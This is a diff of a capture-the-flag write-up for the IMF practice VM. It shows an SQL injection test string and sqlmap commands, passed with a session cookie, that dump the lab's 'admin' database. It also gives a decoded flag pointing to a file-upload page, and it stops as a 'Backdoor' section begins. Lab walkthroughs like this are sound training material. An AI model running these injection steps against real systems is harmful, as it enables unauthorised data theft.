@@ -252,4 +252,55 @@ http://172.16.1.76/imfadministrator/cms.php?pagename='or 'a'='a':
 Under Construction.
 ```
 
-I tried doing this by hand but resorted to using sqlmap. Since you can only access the CMS after logging in, you will need to pass the PHPSESSID through sqlmap: `sqlmap -u 172.16.1.76 --cookie=PHPSESSID=b4gd9bp56ne0b0o4c6il7ep113`
+I tried doing this by hand but resorted to using sqlmap. Since you can only access the CMS after logging in, you will need to pass the PHPSESSID through sqlmap: `sqlmap -u 172.16.1.76 --cookie=PHPSESSID=b4gd9bp56ne0b0o4c6il7ep113`.
+
+I ran the following commands with enumeration switches so that I don't have to manually parse through the output
+
+```bash
+sqlmap -u 172.16.1.76 --cookie=PHPSESSID=b4gd9bp56ne0b0o4c6il7ep113
+...output
+current database:    'admin'
+...output
+
+# enumerate tables before dumping - just to get an idea
+sqlmap -u 172.16.1.76 --cookie=PHPSESSID=b4gd9bp56ne0b0o4c6il7ep113 -D admin --tables
+[12:02:23] [INFO] fetching tables for database: 'admin'
+[12:02:23] [INFO] the SQL query used returns 1 entries
+[12:02:23] [INFO] resumed: pages
+Database: admin                                                                                                                                                                                             
+[1 table]
++-------+
+| pages |
++-------+
+
+# And dump:
+sqlmap -u 172.16.1.76 --cookie=PHPSESSID=b4gd9bp56ne0b0o4c6il7ep113 -D admin --dump
+Database: admin
+Table: pages
+[4 entries]
++----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id | pagename             | pagedata                                                                                                                                                              |
++----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1  | upload               | Under Construction.                                                                                                                                                   |
+| 2  | home                 | Welcome to the IMF Administration.                                                                                                                                    |
+| 3  | tutorials-incomplete | Training classrooms available. <br /><img src="./images/whiteboard.jpg"><br /> Contact us for training.                                                               |
+| 4  | disavowlist          | <h1>Disavowed List</h1><img src="./images/redacted.jpg"><br /><ul><li>*********</li><li>****** ******</li><li>*******</li><li>**** ********</li></ul><br />-Secretary |
++----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+```
+
+So the dump gives us this unpublished page: tutorials-incomplete.
+
+Browsing to that page gives us a picture of a classroom with a QR code. I just used the Window's builtin Snipping Tool to extrat the picture of the QR, and uploaded the picture over on https://webqr.com/ to get the following flag:
+
+```
+flag4{dXBsb2Fkcjk0Mi5waHA=}
+```
+
+Which decodes to `uploadr942.php`
+
+## Backdoor
+
+The previous flag gives us an upload form located at http://172.16.1.76/imfadministrator/uploadr942.php
+
+I'm guessing this will give me a chance to upload a file, but the form does only accept a specific file-type. 
